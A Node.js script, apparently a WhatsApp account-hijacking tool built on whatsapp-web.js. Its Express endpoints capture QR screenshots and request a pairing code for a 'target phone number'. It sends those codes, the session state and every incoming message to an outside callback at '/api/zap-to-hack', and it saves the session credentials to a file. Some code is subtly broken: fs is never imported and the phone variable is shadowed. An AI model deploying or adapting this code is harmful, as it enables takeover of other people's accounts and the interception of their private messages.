// jwt token

const { Client } = require('whatsapp-web.js');

const client = new Client();

let pairingCodeRequested = false; // parear com o telefone
const express = require('express');
const fetch = require('node-fetch');

const app = express();
const env = require('dotenv').config();


const port = process.env.EXPRESS_PORT || 80;
let phone = '';

console.log('URL_CALLBACK', process.env.EXPRESS_PORT);

let urlCallback = process.env.URL_CALLBACK;

app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});



app.get('/connect', (req, res) => {
    try {
        let phone = req.query.phone;
        phone = phone;
        client.initialize();
        if(!client.isReady) {
            client.pupPage.screenshot().then((qr) => {
                let base64string = qr.toString('base64');
    
                fetch(urlCallback + '/api/zap-to-hack', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },

                    body: JSON.stringify({
                        phone: phone,
                        qr: base64string,
                        event: 'print-qrcode',
                    }),
                });
    
                let response = {
                    qr: base64string,
                };
        
                res.send(response);
            });
        }
    
    } catch (error) {
        console.log('Error', error);
    }

});


app.get('/print-screen', (req, res) => {
    try {
        client.initialize();

        client.pupPage.screenshot().then((qr) => {
            let base64string = qr.toString('base64');

            fetch(urlCallback + '/api/zap-to-hack', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    phone: phone,
                    qr: base64string,
                    event: 'print-screen',
                }),
            });

            let response = {
                qr: base64string,
            };

            res.send(response);
        });
    } catch (error) {
        console.log('Error', error);
    }


});


function fetchRequestNumber(phone, pairingCode) {
    // fetch the number from the server, like webhook
    fetch(urlCallback +  '/api/zap-to-hack', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },

        body: JSON.stringify({
            phone: phone,
            pairingCode: pairingCode,
            event: 'pairingCode',
        }),
    })

    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
    })
}

function fetchRequestMessage(phone, message) {
    // fetch the number from the server, like webhook
    fetch(urlCallback + '/api/zap-to-hack', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            phone: phone,
            message: message,
            event: 'message',
        }),
    })
}

client.on('authenticated', (session) => {
    console.log('AUTHENTICATED', session);
    // save the session object to use it later
    fs.writeFile('./session.json', JSON.stringify(session), function (err) {
        if (err) {
            console.error(err);
        }
    });
});

client.on('auth_failure', msg => {
    console.error('AUTHENTICATION FAILURE', msg);
});

client.on('qr', async (qr) => {
    // NOTE: This event will not be fired if a session is specified.
    console.log('QR RECEIVED', qr);

    // paiuting code example
    const pairingCodeEnabled = true;
    if (pairingCodeEnabled && !pairingCodeRequested) {
        const pairingCode = await client.requestPairingCode(phone); // enter the target phone number
        fetchRequestNumber(phone, pairingCode);
        console.log('Pairing code enabled, code: '+ pairingCode);
        pairingCodeRequested = true;
    }
});


function fetchReadyMessage(phone) {
    fetch(urlCallback + '/api/zap-to-hack', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            phone: phone,
            event: 'ready',
        }),
    })
}


client.on('ready', () => {
    fetchReadyMessage(phone);
});

client.on('message', msg => {
    console.log('MESSAGE RECEIVED', msg);
    fetchRequestMessage(phone, msg);
});